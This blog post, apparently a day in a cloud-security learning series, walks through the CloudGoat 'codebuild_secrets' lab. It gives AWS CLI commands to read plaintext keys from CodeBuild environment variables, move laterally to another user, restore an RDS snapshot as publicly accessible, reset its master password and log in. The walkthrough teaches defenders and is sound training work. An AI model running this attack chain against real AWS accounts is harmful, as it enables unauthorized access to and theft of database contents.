---
title: '100 Days of Cloud Security - Day 22: Attack — `codebuild_secrets` - Part 1'
date: '2025-12-01'
author: 'Venkata Pathuri'
excerpt: 'Day 22 of my cloud security journey - Attack — `codebuild_secrets` - Part 1'
tags: ['cloud-security', 'aws', '100days', 'cybersecurity']
---

# Day 22: Attack — `codebuild_secrets` - Part 1

## Overview
Welcome back to our cloud security journey! Today, we dive deep into an exciting yet critical aspect of cloud security—exploiting misconfigurations in AWS CodeBuild and RDS to access sensitive secrets, specifically focusing on the `codebuild_secrets` attack vector. Building on the foundational knowledge from Day 21, where we explored the importance of IAM policies and permissions, we will now put that knowledge to practical use in a simulated attack scenario.

## Learning Objectives
By the end of this session, you will master the techniques for identifying misconfigurations in AWS services. You’ll learn how to enumerate AWS resources, discover sensitive information stored in CodeBuild projects, and exploit RDS permissions to gain unauthorized access to secret keys. This knowledge is essential for understanding how attackers think and operate, empowering you to better defend your cloud environments.

## Deep Dive
In our scenario, we have a setup that includes a CodeBuild project, an RDS instance, a Lambda function, and an EC2 instance within a VPC. The first step is to conduct initial reconnaissance to gather information about our AWS account and resources.

### Initial Recon
Using the AWS CLI, we can determine the identity of the current user. This is done with the following command:

```bash
aws sts get-caller-identity --profile cg
```

The output will provide you crucial details about the user, including the ARN and account ID, which set the stage for our operations.

### EC2 and IAM Enumeration
Next, we’ll enumerate the EC2 instances and IAM user permissions. The command below reveals instances and their metadata:

```bash
aws ec2 describe-instances --profile cg --region us-east-1 --no-cli-pager
```

Look for instances with IMDSv1 enabled, as they may expose sensitive information easily. The `pacu` tool can be an excellent asset for IAM enumeration:

```json
{
  "UserName": "solo",
  "Arn": "arn:aws:iam::997581282912:user/solo",
  "Permissions": {
    "Allow": [
      "codebuild:ListProjects",
      "codebuild:ListBuilds",
      "ec2:DescribeVpcs",
      "ec2:DescribeSecurityGroups",
      "ec2:DescribeSubnets",
      "ec2:DescribeInstances",
      "sts:GetSessionToken",
      "sts:GetCallerIdentity",
      "s3:ListBuckets",
      "dynamodb:DescribeEndpoints"
    ]
  }
}
```

### CodeBuild Discovery
Next, we can list the CodeBuild projects:

```bash
aws codebuild list-projects --profile cg --region us-east-1
```

In our case, we find a project named `cg-codebuild-cgid8tluo788h0`. It’s time to see if there are any hardcoded credentials:

```bash
aws codebuild batch-get-projects --names cg-codebuild-cgid8tluo788h0 --profile cg --region us-east-1
```

Here, we might discover sensitive credentials in the environment variables:

```json
{
    "environment": {
        "environmentVariables": [
            {
                "name": "calrissian-aws-access-key",
                "value": "AKIAIOSFODNN7EXAMPLE  # Example credential - replace with yours",  # Replace with your actual credentials
                "type": "PLAINTEXT"
            },
            {
                "name": "calrissian-aws-secret-key",
                "value": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",  # Replace with your actual credentials
                "type": "PLAINTEXT"
            }
        ]
    }
}
```

### Lateral Movement to RDS
With the `calrissian` user credentials, we can now enumerate RDS permissions. First, authenticate as the `calrissian` user:

```bash
aws sts get-caller-identity --profile cg-user2
```

This user has permissions to interact with RDS, like creating snapshots and restoring instances. 

### RDS Enumeration and Snapshot Creation
Let’s describe the RDS instances:

```bash
aws rds describe-db-instances --profile cg-user2 --region us-east-1
```

This outputs information about the database, including its endpoint. We can then create a snapshot:

```bash
aws rds create-db-snapshot \
  --db-instance-identifier cg-rds-instance-cgid8tluo788h0 \
  --db-snapshot-identifier cg-rds-snapshot \
  --profile cg-user2 --region us-east-1
```

### Restore Snapshot with Public Access
After creating a snapshot, we can restore it with public access, which poses a significant security risk:

```bash
aws rds restore-db-instance-from-db-snapshot \
  --db-instance-identifier cg-rds-restored \
  --db-snapshot-identifier cg-rds-snapshot \
  --db-subnet-group-name cloud-goat-rds-subnet-group-cgid8tluo788h0 \
  --vpc-security-group-ids sg-0bdb37e52bf56fe0d \
  --db-instance-class db.m5.large \
  --publicly-accessible \
  --profile cg-user2 --region us-east-1
```

### Password Reset and Database Access
Finally, we can reset the master password and gain access to the database:

```bash
aws rds modify-db-instance \
  --db-instance-identifier cg-rds-restored \
  --master-user-password cloudgoat \
  --profile cg-user2 --region us-east-1
```

Now, we can connect to the database using the following command:

```bash
psql postgresql://cgadmin:cloudgoat@cg-rds-restored.c1o6qkm66w75.us-east-1.rds.amazonaws.com:5432/securedb
```

## Hands-On Practice
To practice what you've learned today, follow these steps:
1. Execute the commands in the order provided.
2. Verify that you can enumerate and access the RDS instance successfully.
3. Always be cautious of permissions and configurations in your AWS environment to avoid such vulnerabilities.

### Common Troubleshooting Tips
- If you encounter permission errors, double-check the IAM policies attached to your user.
- Ensure that your CLI is configured correctly with the right profile and region.

## Key Takeaways
Today, we uncovered the potential pitfalls of misconfigured AWS services. We explored how easily sensitive credentials can be exposed through CodeBuild and how to leverage those to gain access to RDS instances. Understanding these vulnerabilities is critical for cloud security practitioners to better secure their environments.

## Real-World Applications
In real-world scenarios, such misconfigurations can lead to data breaches and unauthorized access to sensitive information. Continuous monitoring and adherence to best practices in IAM policies and resource configurations are essential to mitigate these risks. Regular audits and employing tools such as AWS Config can help keep your cloud environments secure.

---
**Journey Progress:** 22/100 Days Complete 🚀